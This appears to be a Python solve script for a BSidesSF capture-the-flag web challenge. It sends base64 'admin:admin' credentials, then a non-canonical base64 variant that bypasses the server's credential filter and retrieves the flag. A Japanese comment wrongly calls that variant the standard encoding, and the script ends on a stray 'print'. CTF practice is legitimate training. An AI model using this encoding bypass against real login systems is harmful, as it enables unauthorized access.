import base64
import requests

def get_url():
    return "https://extinction-63b64602.challenges.bsidessf.net"

encoded_creds = base64.b64encode(b'admin:admin').decode('utf-8')
url = f"{get_url()}/index.php?encoded_creds={encoded_creds}"
response = requests.post(url)

if "CTF" in response.text or "AHA" not in response.text:
    print("Something went wrong: the 'bad' request wasn't correctly handled!")
    exit(1)

# 正しい認証情報を使って再度試す
encoded_creds = "YWRtaW46YWRtaW5="  # これは 'admin:admin' の Base64エンコード結果
url = f"{get_url()}/index.php?encoded_creds={encoded_creds}"
response = requests.post(url)

if response.status_code == 200:
    print("Flag Found:", response.text)
else:
    print(f"Something went wrong: {response.text}")
    exit(1)

print